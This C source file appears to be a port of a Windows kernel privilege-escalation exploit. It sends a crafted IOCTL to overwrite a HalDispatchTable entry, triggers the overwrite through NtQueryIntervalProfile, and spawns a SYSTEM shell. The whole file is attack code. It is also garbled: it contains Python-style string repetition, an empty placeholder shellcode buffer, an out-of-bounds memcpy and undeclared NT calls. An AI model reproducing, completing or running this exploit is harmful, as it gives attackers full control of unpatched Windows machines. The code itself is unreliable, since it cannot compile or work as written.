#include <stdio.h>
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <psapi.h>

#define IOCTL 0x120BB
#define SHELLCODE_ADDRESS_DEP 0x2071E
#define SHELLCODE_ADDRESS_NODEP 0x207B8
#define SHELLCODE_SIZE 123
#define ORIGINAL_SIZE 123
#define HAL_DISPATCH_TABLE_OFFSET 4
#define HAL_DISPATCH_TABLE_OFFSET2 8
#define TOKEN_OFFSET_XP 0xC8
#define TOKEN_OFFSET_2K3 0xD8
#define KPROCESS_OFFSET_XP 0x44
#define KPROCESS_OFFSET_2K3 0x38
#define APLINKS_OFFSET_XP 0x88
#define APLINKS_OFFSET_2K3 0x98
#define UPID_OFFSET_XP 0x94
#define UPID_OFFSET_2K3 0x98

int main(int argc, char** argv) {
    WSADATA wsaData;
    SOCKET client;
    sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(4455);
    addr.sin_addr.s_addr = htonl(0x7F000001); // 127.0.0.1

    WSAStartup(MAKEWORD(2, 2), &wsaData);
    client = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    if (client == INVALID_SOCKET) {
        printf("WSASocket error: %d\n", WSAGetLastError());
        return 1;
    }

    if (connect(client, (struct sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
        printf("Connect error: %d\n", WSAGetLastError());
        closesocket(client);
        return 1;
    }

    int baseadd = 0x1001;
    int MEMRES = 0x1000 | 0x2000;
    int PAGEEXE = 0x00000040;
    int Zerobits = 0;
    int RegionSize = 0x1000;
    int written = 0;

    char irpstuff[] = "\x41\x41\x41\x41\x42\x42\x42\x42"
                      "\x00\x00\x00\x00\x44\x44\x44\x44"
                      "\x01\x00\x00\x00"
                      "\xe8\x00" "4" "\xf0\x00" "\x45"*231;

    NTSTATUS dwStatus = NtAllocateVirtualMemory(-1, &baseadd, 0x0, &RegionSize, MEMRES, PAGEEXE);
    WriteProcessMemory((HANDLE)-1, (LPVOID)0x1000, irpstuff, 0x100, &written);

    int shellcode_address_dep = SHELLCODE_ADDRESS_DEP;
    int shellcode_address_nodep = SHELLCODE_ADDRESS_NODEP;
    int shellcode_size = SHELLCODE_SIZE;
    int orig_size = ORIGINAL_SIZE;
    char shellcode[123]; // Fill this with the shellcode bytes
    char trail_padding[13]; // Calculate the number of padding bytes needed
    memcpy(shellcode + shellcode_size, trail_padding, sizeof(trail_padding));
    int inputbuffer = 0x1004;
    int inputbuffer_size = 0x108;
    int outputbuffer_size = 0;
    int outputbuffer = HAL_DISPATCH_TABLE_OFFSET + 0x1; // HalDispatchTable+0x4+1
    IO_STATUS_BLOCK IoStatusBlock;

    NTSTATUS status = ZwDeviceIoControlFile(client, NULL, NULL, NULL, &IoStatusBlock, IOCTL,
                                            &inputbuffer, inputbuffer_size, &outputbuffer, outputbuffer_size);

    int inp = 0x1337;
    ULONG out;
    status = NtQueryIntervalProfile(inp, &out);

    printf("Spawning a SYSTEM shell...\n");
    system("cmd.exe /T:C0 /K cd c:\\windows\\system32");

    printf("Restoring token...\n");
    // Restore token shellcode
    memcpy(shellcode, trail_padding, sizeof(trail_padding));

    status = ZwDeviceIoControlFile(client, NULL, NULL, NULL, &IoStatusBlock, IOCTL,
                                   &inputbuffer, inputbuffer_size, &outputbuffer, outputbuffer_size);

    status = NtQueryIntervalProfile(inp, &out);

    printf("Restore done! Have a nice day :)\n");

    closesocket(client);
    WSACleanup();
    return 0;
}
